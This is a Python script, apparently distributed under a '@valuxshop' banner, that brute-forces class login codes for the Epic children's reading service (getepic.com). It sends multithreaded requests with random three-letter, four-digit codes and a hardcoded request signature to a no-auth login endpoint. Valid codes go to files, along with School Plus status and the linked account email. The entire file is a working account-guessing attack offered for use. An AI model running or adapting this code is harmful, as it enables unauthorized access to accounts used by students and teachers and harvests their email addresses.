import requests
import random
import string
import threading

url = 'https://api-web.getepic.com/webapi/index.php?class=WebAccount&method=noAuthLogin'

headers = {
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://www.getepic.com',
    'Referer': 'https://www.getepic.com/students',
}

lock = threading.Lock()
generated_strings = []

# Generate a random string with lowercase letters and digits
def generate_random_string():
    letters = string.ascii_lowercase
    digits = string.digits

    random_string = ''.join(random.choice(letters) for _ in range(3))
    random_string += ''.join(random.choice(digits) for _ in range(4))

    return random_string

# Prompt for the number of strings and threads to generate
def prompt_num_strings_and_threads():
    print("""

   ______     __     ______      _     
  / ____/__  / /_   / ____/___  (_)____
 / / __/ _ \/ __/  / __/ / __ \/ / ___/
/ /_/ /  __/ /_   / /___/ /_/ / / /__  
\____/\___/\__/  /_____/ .___/_/\___/  
                      /_/              

Made by @valuxshop | Discord Server (soon)                                                               

    """)
    while True:
        try:
            num_strings = int(input("Enter the total number of class codes to generate: "))
            num_threads = int(input("Enter the number of threads to use: "))
            if num_strings <= 0 or num_threads <= 0:
                print("Please enter positive numbers for both strings and threads.")
            else:
                return num_strings, num_threads
        except ValueError:
            print("Invalid input. Please enter valid numbers.")

# Send request with generated string
def send_request(num_strings):
    while True:
        with lock:
            if len(generated_strings) >= num_strings:
                break

        accountLoginCode = generate_random_string()

        response = requests.post(url, headers=headers, data=f'accountLoginCode={accountLoginCode}&dev=web&ver=3.5&reqSig=7a47c6c62a3bb881d3adbb6865b7d741')

        with lock:
            generated_strings.append(accountLoginCode)

        json_response = response.json()
        result = json_response.get('result')

        if result is None:
            print(f"Class Code: {accountLoginCode} - Invalid")
        else:
            is_school_plus = result.get('Account', {}).get('isSchoolPlus', 0)
            login = result.get('Account', {}).get('login', '')

            with lock:
                if accountLoginCode in generated_strings[:-1]:
                    print(f"Class Code: {accountLoginCode} - Duplicate")
                    with open('duplicates.txt', 'a') as f:
                        f.write(f"{accountLoginCode}\n")
                else:
                    print(f"Class Code: {accountLoginCode} - Valid")
                    with open('working.txt', 'a') as f:
                        f.write(f"{accountLoginCode}\n")

                    with open('extra.txt', 'a') as f:
                        is_school_plus_text = "Yes" if is_school_plus == 1 else "No"
                        f.write(f"Class Code: {accountLoginCode} - Is School Plus: {is_school_plus_text} - Account Email: {login}\n")

# Main
def main():
    num_strings, num_threads = prompt_num_strings_and_threads()

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_request, args=(num_strings,))
        thread.start()
        threads.append(thread)

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

    print(f"Roughly {num_strings} Class Codes Generated!")

if __name__ == '__main__':
    main()
